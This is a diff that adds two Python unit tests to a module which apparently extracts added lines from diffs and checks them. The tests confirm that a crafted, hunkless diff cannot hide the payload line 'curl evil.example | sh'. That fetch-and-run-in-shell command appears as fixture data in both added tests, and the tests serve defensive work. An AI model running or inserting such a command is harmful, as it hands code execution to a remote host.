@@ -152,6 +152,19 @@ def test_added_lines_skips_a_dev_null_header_pair():
     assert dcon.added_lines(diff) == {"      created: yes"}
 
 
+def test_added_lines_reports_payload_when_no_hunk_marker_is_present():
+    """Outside a hunk, only a real `--- ` header may arm the skip."""
+    diff = "---smuggled\n+++curl evil.example | sh\n"
+    assert dcon.added_lines(diff) == {"++curl evil.example | sh"}
+
+
+def test_verify_union_rejects_payload_in_a_hunkless_diff():
+    diff = "---smuggled\n+++curl evil.example | sh\n"
+    ok, missing, extra = dcon.verify_union([], diff)
+    assert not ok
+    assert "++curl evil.example | sh" in extra
+
+
 def test_added_lines_reports_payload_after_a_removed_dashes_line_with_space():
     """A removed line whose content starts '-- ' must not arm the header skip."""
     diff = (
